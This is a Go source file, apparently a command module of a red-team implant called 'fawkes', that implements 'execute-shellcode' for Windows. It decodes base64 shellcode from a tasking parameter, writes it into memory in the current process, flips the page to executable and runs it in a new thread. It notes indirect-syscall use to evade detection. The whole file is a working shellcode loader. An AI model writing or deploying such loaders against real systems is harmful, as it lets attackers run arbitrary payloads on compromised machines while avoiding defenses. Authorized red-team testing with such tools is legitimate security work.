//go:build windows

package commands

import (
	"encoding/base64"
	"unsafe"

	"fawkes/pkg/structs"
)

// ExecuteShellcodeCommand executes shellcode in the current process.
type ExecuteShellcodeCommand struct{}

func (c *ExecuteShellcodeCommand) Name() string {
	return "execute-shellcode"
}

func (c *ExecuteShellcodeCommand) Description() string {
	return "Execute shellcode in the current process"
}

var (
	procCreateThread     = kernel32.NewProc("CreateThread")
	procWaitSingleObject = kernel32.NewProc("WaitForSingleObject")
	procVirtualAllocSC   = kernel32.NewProc("VirtualAlloc")
	procVirtualProtectSC = kernel32.NewProc("VirtualProtect")
)

func (c *ExecuteShellcodeCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("Error: shellcode_b64 parameter required")
	}
	args, parseErr := unmarshalParams[executeShellcodeArgs](task)
	if parseErr != nil {
		return *parseErr
	}
	if args.ShellcodeB64 == "" {
		return errorResult("Error: shellcode_b64 is empty")
	}

	shellcode, err := base64.StdEncoding.DecodeString(args.ShellcodeB64)
	if err != nil {
		return errorf("Error decoding shellcode: %v", err)
	}

	if len(shellcode) == 0 {
		return errorResult("Error: shellcode is empty after decoding")
	}

	currentProcess := ^uintptr(0) // -1 = current process pseudohandle
	method := "Standard"

	// Step 1: Allocate RW memory
	addr, err := injectAllocMemory(currentProcess, len(shellcode), PAGE_READWRITE)
	if err != nil {
		return errorf("Error: %v", err)
	}

	// Step 2: Copy shellcode (in-process, no API needed — more efficient than WriteProcessMemory)
	//nolint:gosec // intentional shellcode execution for red team tool
	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(shellcode)), shellcode)

	// Step 3: Change to RX (W^X enforcement)
	if _, err := injectProtectMemory(currentProcess, addr, len(shellcode), PAGE_EXECUTE_READ); err != nil {
		return errorf("Error: %v", err)
	}

	// Step 4: Create thread
	hThread, err := injectCreateRemoteThread(currentProcess, addr)
	if err != nil {
		return errorf("Error: %v", err)
	}
	injectCloseHandle(hThread)

	if IndirectSyscallsAvailable() {
		method = "Indirect syscalls (calls from ntdll)"
	}

	return successf("Shellcode executed successfully\n  Size: %d bytes\n  Address: 0x%X\n  Method: %s\n  Thread created and running", len(shellcode), addr, method)
}
